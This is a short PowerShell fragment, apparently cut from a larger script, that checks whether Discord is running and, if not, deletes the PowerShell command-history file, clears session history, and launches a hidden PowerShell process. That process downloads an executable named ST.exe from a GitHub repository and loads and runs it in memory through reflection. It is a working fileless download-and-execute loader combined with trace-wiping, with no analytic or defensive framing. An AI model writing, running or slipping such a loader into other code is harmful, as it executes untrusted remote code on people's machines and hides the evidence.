...
if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
    ...
    Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    Clear-History -ErrorAction SilentlyContinue
    Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command `"& { $b=(New-Object Net.WebClient).DownloadData('https://github.com/zold1337/toolsvip/raw/refs/heads/main/ST.exe'); $e=[Reflection.Assembly]::Load($b).EntryPoint; $a=New-Object object[] 1; $a[0]=[string[]]@(); $e.Invoke($null, $a) }`""
    Exit
}
